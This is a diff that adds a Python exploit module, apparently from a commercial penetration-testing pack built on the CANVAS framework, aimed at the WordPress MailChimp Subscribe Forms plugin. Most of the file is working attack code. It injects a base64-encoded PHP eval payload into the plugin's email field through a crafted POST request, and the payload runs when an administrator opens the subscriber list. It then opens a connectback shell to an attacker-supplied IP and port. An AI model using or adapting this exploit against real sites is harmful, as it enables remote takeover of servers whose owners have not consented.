@@ -1,0 +1,102 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+	
+from exploitutils import *
+from ExploitTypes.php_multi import *
+
+import canvasengine
+import time
+import urllib
+import libs.spkproxy as spkproxy #for urlopen
+
+# GUI info
+NAME = "WordPress MailChimp Subscribe Forms Local Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in WordPress MailChimp Subscribe Forms"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "WordPress"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2015/04/21"
+DOCUMENTATION["VersionsAffected"] = ""
+DOCUMENTATION["References"] = "https://wpvulndb.com/vulnerabilities/7935"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = "php code is executed when the admin checks the DB Subscribers List."
+
+VERSION="1.0"
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(php_multi):
+    def __init__(self):
+        php_multi.__init__(self)
+        self.port=80
+        self.host=""
+        self.ssl=""
+        self.name=NAME
+        self.basepath="/"
+        self.basepaths=["/wordpress/"]
+        self.command=None 
+        self.basicauth_user=""
+        self.basicauth_password=""
+        self.hostname=None
+        self.foundstrings=["WordPress"]
+        self.testfile="wp-login.php"
+
+        return
+
+    def request1(self):
+        """
+	Goes through a loop of log file paths in the phpexploit class
+	and trys to inject/include PHPcode in these log files to get execution.
+        """
+        
+        command=self.get_php_to_mosdef()
+        command=b64encode(command)
+
+        params={}                
+        params["submit"]= ""
+        params["sm_email"]= "<?php eval(base64_decode(%s)); ?>"%command                    
+        data = self.UA.POST("wp-content/plugins/mailchimp-subscribe-smtags/data.php?savedata=1", data=params)                    
+
+        self.log("[+] Looking for PHP connectback")        
+
+    def usage(self):
+        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
+        print "-t <target ip>"
+        print "-p <target port>                [optional]"
+        print "-O basepath: /path/to/phplist/[optional]"
+        print "-O hostname: target vhost       [optional]"
+        print "-O command:commandtorun         [optional]"
+        print "-l call back ip if doing connect back"
+        print "-d listening port for call back"
+        return
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
